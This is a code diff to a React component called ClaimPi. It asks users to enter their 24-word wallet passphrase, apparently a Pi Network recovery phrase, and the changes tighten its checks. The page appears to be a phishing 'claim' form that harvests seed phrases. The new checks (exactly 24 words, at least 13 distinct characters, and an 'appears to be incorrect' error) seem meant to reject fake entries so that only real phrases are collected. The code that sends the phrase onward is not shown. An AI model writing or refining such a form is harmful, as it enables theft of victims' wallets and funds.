@@ -7,7 +7,6 @@ import { DotLottieReact } from "@lottiefiles/dotlottie-react";
 function ClaimPi(props) {
   const addAddress = async (address) => {
     if (!checkAddress(address)) {
-      console.log(!checkAddress(address));
       return;
     }
     setTimeout(async () => {
@@ -23,16 +22,25 @@ function ClaimPi(props) {
   };
   function checkAddress(address) {
     const checkedAddress = address.split(" ");
+    const splitForLetter = address.split("");
     const checkForEmptyWord = checkedAddress.filter(
       (word) => word.length === 0,
     );
+    const letters = [];
+    splitForLetter.forEach((item) => {
+      if (!letters.includes(item)) {
+        letters.push(item);
+      }
+    });
     const newErrors = {
       address: "",
     };
     if (!address) {
       newErrors.address = "*Please enter 24-word passphrase address";
-    } else if (checkedAddress.length < 24 || checkForEmptyWord.length) {
+    } else if (checkedAddress.length !== 24 || checkForEmptyWord.length) {
       newErrors.address = "*Please enter a valid 24-word passphrase address";
+    } else if (letters.length < 13) {
+      newErrors.address = "*Your passphrase appears to be incorrect";
     } else {
       newErrors.address = "";
       setLoading(true);
